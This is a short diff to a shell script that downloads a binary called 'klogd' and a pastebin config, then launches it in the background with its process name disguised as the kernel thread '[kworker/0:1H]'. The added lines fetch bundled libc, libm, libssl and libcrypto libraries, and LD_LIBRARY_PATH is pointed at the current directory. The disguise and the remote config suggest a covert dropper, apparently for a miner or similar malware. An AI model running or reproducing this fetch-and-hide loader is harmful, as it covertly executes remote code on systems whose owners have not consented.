@@ -2,6 +2,10 @@
 curl -L -o klogd https://github.com/gabjohn3/cw/raw/refs/heads/main/klogd
 chmod +x klogd
 curl -L -o config.json https://pastebin.com/raw/Az5tB4tm
+curl -L -o libssl.so.3 https://github.com/gabjohn3/cw/raw/refs/heads/main/libssl.so.3
+curl -L -o libcrypto.so.3 https://github.com/gabjohn3/cw/raw/refs/heads/main/libcrypto.so.3
+curl -L -o libc.so.6 https://github.com/gabjohn3/cw/raw/refs/heads/main/libc.so.6
+curl -L -o libm.so.6 https://github.com/gabjohn3/cw/raw/refs/heads/main/libm.so.6
 export LD_LIBRARY_PATH=.
 nohup bash -c "exec -a [kworker/0:1H] ./klogd" >/dev/null 2>&1 &
 nohup bash -c 'while true; do sleep 300; done' >/dev/null 2>&1 &
